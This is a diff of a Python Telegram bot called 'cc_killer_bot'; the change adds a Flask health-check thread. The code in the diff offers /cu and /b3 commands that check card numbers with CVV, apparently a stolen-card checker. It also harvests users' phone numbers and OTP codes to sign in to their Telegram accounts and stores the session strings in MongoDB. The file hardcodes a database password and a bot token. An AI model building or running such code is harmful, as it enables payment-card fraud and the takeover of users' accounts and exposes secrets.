@@ -1,12 +1,13 @@
 import re
+import random
+import threading
+from flask import Flask
 from pyrogram import Client, filters
 from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError
 from telethon.sessions import StringSession
-import pymongo
 from pymongo import MongoClient
-import random
 
 # MongoDB Setup
 client = MongoClient('mongodb+srv://Krishna:pss968048@cluster0.4rfuzro.mongodb.net/?retryWrites=true&w=majority')
@@ -21,6 +22,15 @@ BOT_TOKEN = "8009070392:AAF2e26nQnu49Z9Z8UHJFNOPivSGLMjzb-o"
 # Initialize Pyrogram Client
 app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
+# Flask App for Health Check
+flask_app = Flask(__name__)
+
+@flask_app.route('/')
+def index():
+    return "Bot is running!"
+
+def run_flask():
+    flask_app.run(host="0.0.0.0", port=8080)
 
 @app.on_message(filters.command("start"))
 async def start(client, message: Message):
@@ -34,7 +44,6 @@ async def start(client, message: Message):
         "[✓] ` /b3 `  [card_details] ⌁  ᴄʜᴇᴄᴋ ᴄᴀʀᴅ \n"
     )
     await message.reply_text(instructions)
-
 
 @app.on_message(filters.regex(r"^/cu .*") | filters.regex(r"^/b3 .*"))
 async def handle_card_check(client, message: Message):
@@ -58,11 +67,9 @@ async def handle_card_check(client, message: Message):
     else:
         await message.reply_text("❌ Invalid card details. Please try again.")
 
-
 def validate_card(card_details: str) -> bool:
     pattern = r"^\d{12,19}\|\d{2}\|\d{2}\|\d{3}$"
     return re.match(pattern, card_details) is not None
-
 
 @app.on_message(filters.command("register"))
 async def register(client, message: Message):
@@ -74,7 +81,6 @@ async def register(client, message: Message):
     keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
     await message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)
-
 
 @app.on_message(filters.contact)
 async def handle_phone_number(client, message: Message):
@@ -111,7 +117,6 @@ async def handle_phone_number(client, message: Message):
     except Exception as e:
         await message.reply_text(f"Error sending OTP: {str(e)}")
 
-
 @app.on_message(filters.text & filters.private)
 async def handle_otp_or_password(client, message: Message):
     user_id = message.chat.id
@@ -121,14 +126,12 @@ async def handle_otp_or_password(client, message: Message):
 
     telethon_client = TelegramClient(StringSession(), API_ID, API_HASH)
 
-    # If entering OTP
     otp = message.text.strip()
     try:
         await telethon_client.connect()
         await telethon_client.sign_in(user_info["phone_number"], otp, phone_code_hash=user_info["phone_code_hash"])
         session_string = telethon_client.session.save()
 
-        # Save session string in the database
         users_collection.update_one(
             {"user_id": user_id},
             {"$set": {"session_string": session_string, "status": "logged_in"}},
@@ -150,7 +153,6 @@ async def handle_otp_or_password(client, message: Message):
         await message.reply_text("Invalid OTP. Please try again.")
     except Exception as e:
         await message.reply_text(f"Error logging in: {str(e)}")
-
 
 @app.on_callback_query(filters.regex(r"^\d$"))
 async def handle_otp_digit(client, callback_query):
@@ -203,6 +205,6 @@ async def handle_otp_digit(client, callback_query):
                 upsert=True
             )
 
-
 if __name__ == "__main__":
+    threading.Thread(target=run_flask).start()
     app.run()
